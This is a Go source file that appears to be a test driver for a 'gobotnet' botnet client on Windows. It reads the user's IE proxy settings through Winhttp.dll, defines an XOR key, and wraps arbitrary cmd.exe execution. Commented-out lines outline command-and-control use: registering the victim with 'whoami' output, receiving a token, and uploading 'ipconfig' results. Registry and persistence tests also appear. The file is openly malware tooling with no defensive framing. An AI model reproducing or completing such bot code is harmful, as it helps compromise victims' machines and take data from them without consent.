package main

import (
	"fmt"
	"gobotnet"
	"math/rand"
	"net/url"
	"os/exec"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
	//"wrapper"
)

var (
	winhttpdll, _                            = syscall.LoadLibrary("Winhttp.dll")
	winHttpGetIEProxyConfigForCurrentUser, _ = syscall.GetProcAddress(winhttpdll,
		"WinHttpGetIEProxyConfigForCurrentUser")
	Address     string = ""
	Lite        bool   = false
	Debug       bool   = true
	XorString   []byte = []byte{11, 22, 33, 44}
	letterRunes        = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
)

type winHttpIEProxyConfig struct {
	fAutoDetect       bool
	lpszAutoConfigUrl *uint16
	lpszProxy         *uint16
	lpszProxyBypass   *uint16
}

type CString *uint16

func WinHttpGetIEProxyConfigForCurrentUser(lpIeProxy *winHttpIEProxyConfig) (result int) {
	ret, _, _ := syscall.Syscall(uintptr(winHttpGetIEProxyConfigForCurrentUser),
		1,
		uintptr(unsafe.Pointer(lpIeProxy)),
		0,
		0)
	return int(ret)
}

func GetIEProxyFromWinHttp() (*url.URL, error) {
	var ieProxy winHttpIEProxyConfig
	WinHttpGetIEProxyConfigForCurrentUser(&ieProxy)
	fmt.Println(ieProxy)
	if ieProxy.lpszProxy == nil {
		return url.Parse("")
	}
	str := CStringToString(CString(ieProxy.lpszProxy))
	return url.Parse(str)
}

func DebugLogging(text string) {
	if Debug {
		currentTime := time.Now().Local()
		fmt.Println("[", currentTime.Format(time.RFC850), "] "+text)
	}
}

func CmdExec(cmd string) []byte {
	out, err := exec.Command("cmd", "/C", cmd).Output()
	if err != nil {
		DebugLogging(err.Error())
	}
	return out
}

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func CStringToString(cs CString) (s string) {
	if cs != nil {
		us := make([]uint16, 0, 256)
		for p := uintptr(unsafe.Pointer(cs)); ; p += 2 {
			u := *(*uint16)(unsafe.Pointer(p))
			if u == 0 {
				return string(utf16.Decode(us))
			}
			us = append(us, u)
		}
	}
	return ""
}

func main() {
	fmt.Println(GetIEProxyFromWinHttp())
	defer syscall.FreeLibrary(winhttpdll)
	//gobotnet.UnRegisterProgram()
	//gobotnet.CmdTest()
	//gobotnet.RegTest()
	//gobotnet.RegistryTest()
	gobotnet.FileOperationTest()

	// rand.Seed(time.Now().UnixNano())
	//strproxy, proxy = GetIEProxyFromWinHttp()
	//wrapper.Test()

	//wrapper.Apitestwin()
	// fmt.Println(wrapper.InitSession())
	// whoami := CmdExec("whoami")
	// _, token := wrapper.ApiRegister(RandStringRunes(64), string(whoami[:len(whoami)]))
	// fmt.Printf("this is token = %s", token)

	// ipconfig := CmdExec("ipconfig")
	// wrapper.ApiOutputCommand(token, "ipconfig", ipconfig)
}
